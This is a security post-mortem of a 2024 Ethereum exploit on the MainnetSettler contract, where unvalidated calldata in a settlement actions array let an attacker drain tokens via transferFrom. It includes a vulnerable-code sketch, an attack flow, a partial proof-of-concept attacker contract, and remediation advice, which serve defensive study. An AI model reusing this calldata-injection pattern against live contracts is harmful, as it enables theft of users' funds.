# MainnetSettler — Arbitrary Execution Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-18 |
| **Protocol** | MainnetSettler |
| **Chain** | Ethereum |
| **Loss** | ~66,000 USD |
| **Attacker** | [0x3a388773](https://etherscan.io/address/0x3a38877312d1125d2391663cba9f7190953bf2d9) |
| **Attack Tx** | [0xfab5912f](https://etherscan.io/tx/0xfab5912f858b3768b7b7d312abcc02b64af7b1e1b62c4f29a2c1a2d1568e9fa2) |
| **Vulnerable Contract** | MainnetSettler (0x70bf6634) |
| **Root Cause** | The Settler contract's action execution logic executes arbitrary calldata (including transferFrom) without validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/MainnetSettler_exp.sol) |

---
## 1. Vulnerability Overview

MainnetSettler is a contract that executes an array of settlement actions sequentially. The attacker injected `transferFrom(addr3, attacker, largeAmount)` calldata into the actions array to drain tokens held by the Settler. When the Settler contract already held approvals or directly held assets, arbitrary action execution led to asset exfiltration.

## 2. Vulnerable Code Analysis

```solidity
// ❌ MainnetSettler: no validation of calldata in the actions array
contract MainnetSettler {
    function settle(
        bytes[] calldata actions,
        Slippage[] calldata slippages,
        bytes32 notedata
    ) external {
        for (uint i = 0; i < actions.length; i++) {
            // ❌ Executes calldata from actions[i] without validation
            // ❌ Allows arbitrary ERC20 function calls such as transferFrom
            (address target, bytes memory calldata_) = abi.decode(actions[i], (address, bytes));
            target.call(calldata_);
        }
    }
}

// Attacker's malicious actions:
// call1: Invoke Settler internal function (set permissions)
// call2: ERC20.transferFrom(addr3, attacker, largeAmount)

// ✅ Fix:
// Whitelist validation on target addresses in actions
// Verify that transferFrom's `from` is msg.sender
// Apply selector-based allowlist
```

## 3. Attack Flow

```
Attacker (0x3a388773)
  │
  ├─[1]─▶ Deploy AttackerC → attack executed immediately in constructor
  │
  ├─[2]─▶ Construct actions array:
  │         call1: selector 0x38c9c147 (set internal permissions/state)
  │         call2: transferFrom(addr3, attacker, 308453642481581939556432141)
  │
  ├─[3]─▶ MainnetSettler.settle(actions, slippages, notedata)
  │         └─ ❌ Execute call1 → set state
  │             ❌ Execute call2 → drain large amount of tokens via transferFrom
  │
  └─[4]─▶ ~66,000 USD stolen
```

## 4. PoC Code

```solidity
contract AttackerCC {
    constructor() {
        bytes32 fixeddata = hex"e0b1db9e7c871328327e3f9e0000000000000000000000000000000000000000";

        // ❌ Malicious call 1: manipulate internal state/permissions
        bytes memory call1 = abi.encodeWithSelector(
            bytes4(0x38c9c147),
            uint256(0), uint256(10000),
            address(hold), uint256(0), uint256(160), uint256(100)
        );

        // ❌ Malicious call 2: drain tokens via transferFrom
        bytes memory call2 = abi.encodeWithSelector(
            bytes4(0x23b872dd),  // transferFrom selector
            address(addr3),      // from
            address(attacker),   // to
            uint256(308453642481581939556432141)  // amount
        );

        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodePacked(call1, call2);

        IMainnetSettler.Slippage[] memory slippages = new IMainnetSettler.Slippage[](1);
        // ... call Settler.settle()
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call / Business Logic Vulnerability |
| **Attack Vector** | Injection of arbitrary calldata into the actions array |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP** | Business Logic Vulnerability |
| **Severity** | Critical |

## 6. Remediation Recommendations

1. **Actions Whitelist**: Execute only permitted contract addresses and function selectors
2. **transferFrom Restriction**: Allow only cases where `from` is msg.sender or the contract itself
3. **Restrict Executable Actions**: Clearly limit the scope of actions the settle function may execute beyond slippage handling
4. **Audit Logging**: Record all action executions as events for anomaly detection

## 7. Lessons Learned

- In settler/aggregator patterns, the actions array must be subject to strict whitelisting and selector validation.
- If calldata containing `transferFrom` can be executed arbitrarily, tokens belonging to any address can be stolen.
- General-purpose execution contracts (multi-call, settlement) have a very broad attack surface and require dedicated, in-depth audits.